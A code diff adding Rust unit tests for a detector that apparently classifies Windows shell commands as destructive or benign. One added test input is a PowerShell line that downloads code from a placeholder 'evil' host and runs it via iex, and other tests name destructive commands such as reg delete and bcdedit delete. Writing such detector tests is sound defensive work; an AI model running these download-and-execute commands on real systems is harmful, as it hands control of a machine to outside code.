@@ -57,6 +57,11 @@ fn flags_invoke_expression() {
     assert!(is_destructive_windows_segment(
         "invoke-expression 'Remove-Item C:\\Tmp'"
     ));
+    // iex is the built-in PowerShell alias for Invoke-Expression
+    assert!(is_destructive_windows_segment(
+        "iex (Invoke-WebRequest -Uri 'http://evil/payload').Content"
+    ));
+    assert!(is_destructive_windows_segment("iex $cmd"));
 }
 
 #[test]
@@ -103,6 +108,8 @@ fn flags_reg_delete_and_bcdedit_delete() {
 #[test]
 fn ignores_benign_commands() {
     assert!(!is_destructive_windows_segment("del foo.txt"));
+    // del /q /f without /s only affects named files — not recursive
+    assert!(!is_destructive_windows_segment("del /Q /F foo.txt"));
     assert!(!is_destructive_windows_segment("dir /S"));
     assert!(!is_destructive_windows_segment("Get-ChildItem -Recurse"));
     assert!(!is_destructive_windows_segment("echo hello"));
@@ -112,4 +119,22 @@ fn ignores_benign_commands() {
     assert!(!is_destructive_windows_segment("rm file.log"));
     // Remove-Item without -Force or -Recurse is not flagged
     assert!(!is_destructive_windows_segment("Remove-Item C:\\Tmp\\file"));
+}
+
+#[test]
+fn ignores_benign_forms_of_existing_entries() {
+    // vssadmin list/query operations are read-only
+    assert!(!is_destructive_windows_segment(
+        "vssadmin list shadows /all"
+    ));
+    // reg query is read-only; only reg delete triggers
+    assert!(!is_destructive_windows_segment(
+        "reg query HKLM\\Software\\Foo /v Bar"
+    ));
+    // bcdedit /enum only reads the boot config
+    assert!(!is_destructive_windows_segment("bcdedit /enum firmware"));
+    // cipher /e encrypts (not the /w wipe-free-space trigger)
+    assert!(!is_destructive_windows_segment("cipher /e file.txt"));
+    // wmic without "delete" is benign
+    assert!(!is_destructive_windows_segment("wmic process list brief"));
 }
